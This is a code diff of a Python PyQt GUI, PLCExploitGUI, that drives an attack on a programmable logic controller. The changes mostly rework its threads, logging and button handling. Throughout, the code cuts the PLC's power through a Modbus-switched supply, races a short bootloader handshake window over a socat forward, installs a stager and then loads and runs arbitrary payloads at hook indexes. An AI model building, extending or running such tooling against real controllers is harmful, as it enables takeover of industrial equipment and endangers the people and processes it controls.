@@ -735,30 +735,22 @@ class PLCExploitGUI(QMainWindow):
 
         # PLC connection logic will be in a thread
         self.status_bar.showMessage("Attempting to connect to PLC...")
-        self._log_to_program_output("Starting PLC connection thread...", "INFO")
-        
-        # Placeholder for actual connection thread
-        # For now, let's simulate success for UI testing purposes
-        # In the real version, a QThread will be started here.
-        self.connect_button.setEnabled(False) # Disable while attempting
+        # self._log_to_program_output("Starting PLC connection thread...", "INFO") # Logged by caller or thread itself
         
         target_host = "localhost" # socat forwards to here
         try:
             target_port = int(self.socat_port_input.text())
         except ValueError:
             self._show_message("Input Error", "Socat TCP Forward Port must be an integer.", "error")
-            self.connect_button.setEnabled(True)
+            self.connect_button.setEnabled(True) # Re-enable connect button on input error before thread start
             return
 
         # Default stager path, can be made configurable later if needed
         stager_payload_path = client.STAGER_PL_FILENAME 
 
         # Create and start the connection thread
-        # Ensure any previous thread is not running or cleaned up, though typically not an issue if button logic is correct
         if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
             self._log_to_program_output("Connection attempt already in progress.", "WARNING")
-            # Optionally re-enable connect button if it was stuck disabled, or show message
-            # self.connect_button.setEnabled(True) 
             return
 
         self.connection_thread = PLCConnectionThread(target_host, target_port, stager_payload_path, self)
@@ -778,11 +770,15 @@ class PLCExploitGUI(QMainWindow):
         self._log_to_program_output("PLC Connection thread has finished.", "DEBUG")
         # This handler is mostly for cleanup or logging. 
         # UI state should be primarily managed by _handle_plc_connected and _handle_plc_connection_error.
-        # If the connect button is still disabled AND we are not connected, it means the thread might have
-        # exited without emitting a success/failure signal properly or was interrupted.
-        if not self.connect_button.isEnabled() and not self.disconnect_button.isEnabled(): # Corrected logic
-             self._log_to_program_output("Connection thread finished, but GUI state suggests no active connection or attempt. Re-enabling connect button.", "WARNING")
-             self.connect_button.setEnabled(True)
+        # If the connect button is still disabled AND we are not connected (disconnect button also disabled),
+        # it means the thread might have exited without emitting a success/failure signal properly or was interrupted.
+        # Re-enable connect button to allow user to retry.
+        if not self.connect_button.isEnabled() and not self.disconnect_button.isEnabled():
+             self._log_to_program_output("Connection thread finished abruptly or state unclear. Re-enabling connect button if socat is up.", "WARNING")
+             if self.socat_process and self.socat_process.state() == QProcess.Running:
+                 self.connect_button.setEnabled(True)
+             else: # Socat not running, connect button should remain disabled.
+                 self.connect_button.setEnabled(False)
 
 
     def _handle_plc_connected(self, version_str, greeting_hex):
@@ -798,17 +794,21 @@ class PLCExploitGUI(QMainWindow):
 
     def _handle_plc_connection_error(self, error_message):
         self._log_to_program_output(f"Thread: PLC Connection Error: {error_message}", "ERROR")
-        self._show_message("Connection Failed", f"PLC Connection Error: {error_message}", "error") # _show_message already logs
-        if self.client_instance: # Should be handled by thread, but good practice
+        # _show_message also logs, so this might be redundant if message is identical.
+        # self._show_message("Connection Failed", f"PLC Connection Error: {error_message}", "error")
+        if self.client_instance:
             self.client_instance.disconnect()
             self.client_instance = None
         
-        self.connect_button.setEnabled(True) # Re-enable connect button
+        # Re-enable connect button only if socat is running
+        if self.socat_process and self.socat_process.state() == QProcess.Running:
+            self.connect_button.setEnabled(True)
+        else:
+            self.connect_button.setEnabled(False)
+
         self.disconnect_button.setEnabled(False)
         self.start_dump_button.setEnabled(False)
         self.execute_payload_button.setEnabled(False)
-        # Optionally stop socat if connection fails completely
-        # self._stop_socat()
 
 
     def _execute_generic_payload(self):
@@ -826,10 +826,8 @@ class PLCExploitGUI(QMainWindow):
         self._log_to_program_output(f"Starting execution of generic payload: {payload_path} with args: '{payload_args}'", "INFO")
         self.execute_payload_button.setEnabled(False) # Disable button during execution
 
-        # Create and start the payload execution thread
         if hasattr(self, 'payload_thread') and self.payload_thread and self.payload_thread.isRunning():
             self._log_to_program_output("Payload execution already in progress.", "WARNING")
-            # self.execute_payload_button.setEnabled(True) # Re-enable if needed, or just let it be
             return
 
         self.payload_thread = ExecutePayloadThread(self.client_instance, payload_path, payload_args, self)
@@ -839,35 +837,30 @@ class PLCExploitGUI(QMainWindow):
 
     def _handle_payload_execution_result(self, message, level):
         self._log_to_program_output(f"PayloadThread: {message}", level)
-        # Optionally show a status bar message for critical results
         if level == "ERROR" or level == "CRITICAL":
             self.status_bar.showMessage(f"Payload execution error: {message[:100]}", 5000)
-        elif level == "INFO" and "response" in message: # Show brief success in status bar
+        elif level == "INFO" and "response" in message:
              self.status_bar.showMessage("Payload executed, response received.", 3000)
 
 
     def _on_payload_thread_finished(self):
         self._log_to_program_output("Payload execution thread finished.", "DEBUG")
-        self.execute_payload_button.setEnabled(True) # Re-enable the button
+        # Re-enable button only if still connected
+        if self.client_instance and self.client_instance.r:
+            self.execute_payload_button.setEnabled(True)
+        else:
+            self.execute_payload_button.setEnabled(False)
 
 
     def _disconnect_plc(self):
-        # If a connection thread is running, we might need to signal it to stop/cancel.
-        # For now, assume connection thread finishes before disconnect is typically hit,
-        # or that client_instance operations are thread-safe / main thread only after connect.
         if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
             self._log_to_program_output("Attempting to stop connection thread before disconnect...", "DEBUG")
-            # Add thread termination logic if applicable (e.g., setting a flag and waiting)
-            # self.connection_thread.quit() # Or a custom stop method
-            # self.connection_thread.wait(1000) # Wait a bit
-            # For simplicity, this example doesn't implement full cancellable thread for connect.
 
         self.status_bar.showMessage("Disconnecting...")
         self._log_to_program_output("Disconnecting from PLC...", "INFO")
 
         if self.client_instance:
             try:
-                # Ask user if they want to send 'bye' or just disconnect
                 reply = QMessageBox.question(self, 'Confirm Disconnect', 
                                            "Send 'bye' command to PLC to allow normal boot?",
                                            QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel, 
@@ -889,15 +882,10 @@ class PLCExploitGUI(QMainWindow):
                 self._log_to_program_output(f"Error sending bye: {e}", "ERROR")
                 self._show_message("Disconnect Error", f"Error during bye command: {e}", "error")
             finally:
-                self.client_instance.disconnect() # This logs internally
+                self.client_instance.disconnect()
                 self.client_instance = None
         
-        # self._stop_socat() # DO NOT stop socat on PLC disconnect as per new requirement
-
         self.status_bar.showMessage("Disconnected from PLC.")
-        # If socat is running, Connect button should be enabled.
-        # If socat is NOT running, Connect button should remain disabled.
-        # This state is managed by _start_socat_manual, _stop_socat_manual, and _socat_finished.
         if self.socat_process and self.socat_process.state() == QProcess.Running:
             self.connect_button.setEnabled(True)
         else:
@@ -912,16 +900,14 @@ class PLCExploitGUI(QMainWindow):
 # --- Worker Threads ---
 
 class ExecutePayloadThread(QThread):
-    # Signal to emit results or errors
-    # result_signal: str with message, str with level (INFO, ERROR, etc.)
     payload_execution_result = pyqtSignal(str, str)
 
     def __init__(self, client_instance, payload_path, payload_args_str, parent_gui):
         super().__init__(parent_gui)
         self.client_instance = client_instance
         self.payload_path = payload_path
-        self.payload_args_str = payload_args_str # Will be encoded to bytes in run()
-        self.parent_gui = parent_gui # To use _log_to_program_output or emit signals
+        self.payload_args_str = payload_args_str
+        self.parent_gui = parent_gui
 
     def run(self):
         try:
@@ -943,18 +929,11 @@ class ExecutePayloadThread(QThread):
 
             self.payload_execution_result.emit(f"Payload size: {len(payload_code)} bytes. Installing...", "INFO")
 
-            # Determine hook index - for generic payloads, we might reuse DEFAULT_SECOND_ADD_HOOK_IND
-            # or make it configurable in the GUI later. For now, use a common one.
-            # Ensure client.py has this constant or pass it.
             target_hook_index = client.DEFAULT_SECOND_ADD_HOOK_IND
 
-            # install_payload_via_stager logs its own progress/errors via client's logger
-            # That logger isn't yet piped to GUI, so we emit our own signals here.
             installed_hook_idx = self.client_instance.install_payload_via_stager(payload_code, add_hook_no=target_hook_index)
             self.payload_execution_result.emit(f"Payload installed at hook index: {installed_hook_idx}", "INFO")
 
-            # Convert string args to bytes. For simplicity, assume UTF-8.
-            # More complex arg handling (hex, etc.) could be added later.
             try:
                 payload_args_bytes = self.payload_args_str.encode('utf-8')
             except Exception as e:
@@ -963,7 +942,6 @@ class ExecutePayloadThread(QThread):
 
             self.payload_execution_result.emit(f"Invoking payload with args: '{self.payload_args_str}' (bytes: {payload_args_bytes.hex()})", "INFO")
 
-            # invoke_add_hook also logs via client's logger
             response = self.client_instance.invoke_add_hook(installed_hook_idx, payload_args_bytes, await_response=True)
 
             if response is not None:
@@ -976,7 +954,7 @@ class ExecutePayloadThread(QThread):
             else:
                 self.payload_execution_result.emit("Payload invoked, no response received or error in reception.", "WARNING")
 
-        except client.PLCInterface.HandshakeError as he: # Should not happen here if already connected
+        except client.PLCInterface.HandshakeError as he:
             self.payload_execution_result.emit(f"Handshake Error during payload execution: {he}", "ERROR")
         except ConnectionError as ce:
             self.payload_execution_result.emit(f"Connection Error during payload execution: {ce}", "ERROR")
@@ -985,25 +963,22 @@ class ExecutePayloadThread(QThread):
         except RuntimeError as re:
             self.payload_execution_result.emit(f"Runtime Error during payload execution: {re}", "ERROR")
         except Exception as e:
-            self.payload_execution_result.emit(f"An unexpected error occurred during payload execution: {e}", "CRITICAL")
+            self.payload_execution_result.emit(f"An unexpected error occurred during payload execution: {type(e).__name__} - {e}", "CRITICAL")
         finally:
-            # Re-enable button in GUI via signal or direct call if safe
-            # For now, let the main thread handle button re-enabling on thread finish
             pass
 
 
 class PLCConnectionThread(QThread):
-    # Signals: success_signal(version_str, greeting_hex), error_signal(error_message)
-    connection_succeeded = pyqtSignal(str, str) # version_str, greeting_hex
-    connection_failed = pyqtSignal(str)    # error_message
-    log_message_signal = pyqtSignal(str, str) # message, level
+    connection_succeeded = pyqtSignal(str, str)
+    connection_failed = pyqtSignal(str)
+    log_message_signal = pyqtSignal(str, str)
 
     def __init__(self, host, port, stager_payload_path, parent_gui):
-        super().__init__(parent_gui) # Pass parent_gui as parent for QThread
+        super().__init__(parent_gui)
         self.host = host
         self.port = port
         self.stager_payload_path = stager_payload_path
-        self.parent_gui = parent_gui # To access client_instance, log methods
+        self.parent_gui = parent_gui
 
     def run(self):
         try:
@@ -1014,94 +989,91 @@ class PLCConnectionThread(QThread):
                 modbus_output = int(self.parent_gui.modbus_output_input.text())
                 power_delay_ms = int(self.parent_gui.power_delay_input.text())
             except ValueError:
+                self.log_message_signal.emit("Invalid Modbus port, output, or power delay. Must be integers.", "ERROR")
                 self.connection_failed.emit("Invalid Modbus port, output, or power delay. Must be integers.")
                 return
 
             self.log_message_signal.emit(f"Starting power cycle (IP: {modbus_ip}, Port: {modbus_port}, Output: {modbus_output}, Delay: {power_delay_ms}ms)...", "INFO")
-
-            # _cycle_power_supply needs to be callable without direct parent_gui GUI calls,
-            # or it also needs to emit signals for logging.
-            # For now, assuming _cycle_power_supply is modified or safe.
-            # Let's assume _cycle_power_supply will use self.log_message_signal if it needs to log.
-            # This means _cycle_power_supply should ideally be part of the thread or take a logger_signal.
-            # Quick fix: Make _cycle_power_supply a helper that the thread calls, and it emits.
-            # For now, let parent_gui._cycle_power_supply log via the thread's signal if possible,
-            # or we pass the signal to it.
-            # Simpler: parent_gui._cycle_power_supply should not log directly if called by thread.
-            # The thread will log before and after.
 
             if not self._thread_cycle_power_supply(modbus_ip, modbus_port, modbus_output, power_delay_ms):
                 # _thread_cycle_power_supply now emits its own logs via log_message_signal
                 self.connection_failed.emit("Power cycle sequence failed.")
                 return
 
-            self.log_message_signal.emit("Power cycle completed. Waiting briefly for PLC to initialize...", "INFO")
-            # Critical: Wait a very short time for PLC to be ready to receive handshake after power ON.
-            # The 500ms window is from PLC powered up to receiving the first byte of handshake.
-            # This sleep is part of that budget.
-            time.sleep(0.2) # 200ms, adjust as needed based on PLC behavior.
+            # CRITICAL TIMING SECTION STARTS AFTER POWER_ON IS CONFIRMED
+            # This sleep is to allow the PLC's bootloader to initialize before we attempt connection.
+            # The 500ms window for handshake starts roughly when the PLC is internally ready.
+            # Adjust this value based on testing; 0.1s = 100ms.
+            initial_plc_boot_wait = 0.1
+            self.log_message_signal.emit(f"Power ON confirmed. Waiting {initial_plc_boot_wait}s for PLC bootloader...", "DEBUG")
+            time.sleep(initial_plc_boot_wait)
 
-            # --- Connection and Handshake Step ---
+            # --- Connection and Handshake Step (Optimized for speed) ---
+            self.log_message_signal.emit(f"Attempting to connect to PLC at {self.host}:{self.port}...", "DEBUG")
             self.parent_gui.client_instance = client.PLCInterface(self.host, self.port)
             
-            if not self.parent_gui.client_instance.connect(): # connect() in client.py logs errors
-                self.connection_failed.emit(f"Socket connection failed to {self.host}:{self.port}.") # Emitting general failure
+            if not self.parent_gui.client_instance.connect():
+                # client.PLCInterface.connect() logs its own errors to client.logger
+                self.log_message_signal.emit(f"Socket connection failed to {self.host}:{self.port}.", "ERROR")
+                self.connection_failed.emit(f"Socket connection failed to {self.host}:{self.port}.")
                 return
 
-            self.log_message_signal.emit(f"Socket connected to {self.host}:{self.port}. Attempting handshake...", "INFO")
+            # Minimal logging here to reduce latency before handshake
+            self.log_message_signal.emit(f"Socket connected. Attempting handshake...", "INFO") # Log this attempt
 
-            success, greeting = self.parent_gui.client_instance.perform_handshake() # This can now raise HandshakeError
-            if not success: # Should be caught by HandshakeError, but as a fallback
-                self.log_message_signal.emit(f"Handshake returned false, but no exception: {greeting}", "ERROR") # Should not happen
+            greeting_hex = "N/A" # Default
+            try:
+                # perform_handshake() will loop for up to ~2 seconds sending MFGT1
+                # It raises HandshakeError on failure or timeout.
+                success, greeting_bytes = self.parent_gui.client_instance.perform_handshake()
+                greeting_hex = greeting_bytes.hex() if greeting_bytes else "N/A"
+                self.log_message_signal.emit(f"Handshake successful! Greeting: {greeting_hex}", "INFO")
+
+            except client.PLCInterface.HandshakeError as he:
+                self.log_message_signal.emit(f"Handshake Error: {he}", "ERROR")
+                self.connection_failed.emit(f"Handshake Error: {he}")
                 if self.parent_gui.client_instance: self.parent_gui.client_instance.disconnect()
                 self.parent_gui.client_instance = None
-                self.connection_failed.emit(f"Handshake failed: {greeting}")
                 return
             
-            greeting_hex = greeting.hex() if greeting else "N/A"
-            version_str = self.parent_gui.client_instance.get_plc_version()
+            # --- Post-Handshake Operations ---
+            version_str = self.parent_gui.client_instance.get_plc_version() # get_plc_version also involves communication
+            self.log_message_signal.emit(f"PLC Version: {version_str}", "INFO")
             
             if not os.path.exists(self.stager_payload_path):
-                self.parent_gui.client_instance.disconnect()
+                err_msg = f"Stager payload {self.stager_payload_path} not found!"
+                self.log_message_signal.emit(err_msg, "ERROR")
+                if self.parent_gui.client_instance: self.parent_gui.client_instance.disconnect() # Disconnect if stager not found
                 self.parent_gui.client_instance = None
-                self.connection_failed.emit(f"Stager payload {self.stager_payload_path} not found!")
+                self.connection_failed.emit(err_msg)
                 return
 
             with open(self.stager_payload_path, "rb") as f:
                 stager_code = f.read()
             
             self.log_message_signal.emit(f"Installing stager ({len(stager_code)} bytes)...", "INFO")
-            # install_stager_payload in client.py logs its own success/failure via client's logger
-            # For GUI feedback, we rely on it raising an exception on failure.
-            self.parent_gui.client_instance.install_stager_payload(stager_code)
-            
+            self.parent_gui.client_instance.install_stager_payload(stager_code) # Raises error on failure
             self.log_message_signal.emit("Stager installed successfully.", "INFO")
-            # If all successful (install_stager_payload would raise on error)
+
             self.connection_succeeded.emit(version_str, greeting_hex)
 
-        except FileNotFoundError as fnf_err:
+        except FileNotFoundError as fnf_err: # Should generally be caught by os.path.exists for stager
+            self.log_message_signal.emit(f"File not found error during connection process: {fnf_err}", "ERROR")
             self.connection_failed.emit(str(fnf_err))
-            if self.parent_gui.client_instance:
-                 self.parent_gui.client_instance.disconnect()
-            self.parent_gui.client_instance = None
-        except Exception as e:
-            self.connection_failed.emit(f"An unexpected error occurred in connection thread: {e}")
-            if self.parent_gui.client_instance: # Ensure client is cleaned up
-                 self.parent_gui.client_instance.disconnect()
-            self.parent_gui.client_instance = None
-        except client.PLCInterface.HandshakeError as he:
-            self.log_message_signal.emit(f"Handshake Error: {he}", "ERROR")
-            self.connection_failed.emit(f"Handshake Error: {he}")
             if self.parent_gui.client_instance: self.parent_gui.client_instance.disconnect()
             self.parent_gui.client_instance = None
-        except ConnectionRefusedError:
+        # HandshakeError is caught specifically above
+        except ConnectionRefusedError: # For socket connect errors
             self.log_message_signal.emit(f"Connection refused by {self.host}:{self.port}. Ensure socat is forwarding correctly and PLC is ready.", "ERROR")
             self.connection_failed.emit(f"Connection refused by {self.host}:{self.port}.")
             if hasattr(self.parent_gui, 'client_instance') and self.parent_gui.client_instance: self.parent_gui.client_instance.disconnect()
             self.parent_gui.client_instance = None
-        except Exception as e: # Catch any other unexpected error from the thread
-            self.log_message_signal.emit(f"Unexpected error in connection thread: {e}", "CRITICAL")
-            self.connection_failed.emit(f"Unexpected error in connection thread: {e}")
+        except Exception as e:
+            # Catch any other unexpected error from the thread to prevent silent crashes
+            import traceback
+            tb_str = traceback.format_exc()
+            self.log_message_signal.emit(f"Unexpected error in connection thread: {type(e).__name__} - {e}\nTraceback:\n{tb_str}", "CRITICAL")
+            self.connection_failed.emit(f"Unexpected error: {e}")
             if hasattr(self.parent_gui, 'client_instance') and self.parent_gui.client_instance and self.parent_gui.client_instance.r:
                  self.parent_gui.client_instance.disconnect()
             self.parent_gui.client_instance = None
@@ -1125,7 +1097,9 @@ class PLCConnectionThread(QThread):
                 self.log_message_signal.emit("Failed to turn power ON.", "ERROR")
                 return False
 
-            self.log_message_signal.emit("Power ON successful. Power cycle complete.", "INFO")
+            # IMPORTANT: Do not add long delays here. The time from this returning True
+            # to the handshake beginning is critical.
+            self.log_message_signal.emit("Power ON successful. Power cycle phase complete.", "INFO")
             return True
 
         except Exception as e:
@@ -1162,23 +1136,30 @@ class PLCConnectionThread(QThread):
         """Handles the main window close event."""
         self._log_to_program_output("Close event triggered. Cleaning up...", "INFO")
 
-        # Attempt to disconnect from PLC if connected
+        if hasattr(self, 'connection_thread') and self.connection_thread and self.connection_thread.isRunning():
+            self._log_to_program_output("Waiting for connection thread to finish...", "DEBUG")
+            self.connection_thread.quit() # Request termination
+            self.connection_thread.wait(1000) # Wait up to 1 sec
+
+        if hasattr(self, 'payload_thread') and self.payload_thread and self.payload_thread.isRunning():
+            self._log_to_program_output("Waiting for payload thread to finish...", "DEBUG")
+            self.payload_thread.quit() # Request termination
+            self.payload_thread.wait(1000) # Wait up to 1 sec
+
         if self.client_instance and self.client_instance.r:
             self._log_to_program_output("PLC seems connected, attempting graceful disconnect...", "INFO")
-            # Simplified disconnect: just close client socket, don't send bye or ask user.
             try:
                 self.client_instance.disconnect()
             except Exception as e:
                 self._log_to_program_output(f"Error during client disconnect on exit: {e}", "WARNING")
             self.client_instance = None
 
-        # Stop socat if it's running
         if self.socat_process and self.socat_process.state() != QProcess.NotRunning:
             self._log_to_program_output("Stopping socat process on exit...", "INFO")
-            self._stop_socat() # This will terminate/kill and wait briefly
+            self._stop_socat()
 
         self._log_to_program_output("Cleanup finished. Exiting application.", "INFO")
-        event.accept() # Accept the close event
+        event.accept()
 
 
 if __name__ == '__main__':
